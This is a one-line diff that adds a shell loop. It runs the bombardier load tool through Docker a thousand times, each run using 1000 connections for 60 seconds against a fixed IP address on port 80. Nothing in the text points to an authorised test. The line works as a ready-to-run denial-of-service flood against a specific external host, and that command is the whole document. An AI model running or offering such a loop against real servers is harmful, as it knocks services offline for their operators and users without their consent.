@@ -1,0 +1,2 @@
+for i in {1..1000}; do docker run -it alpine/bombardier -c 1000 -d 60s -l 88.99.95.180:80 && sleep 5; done
+
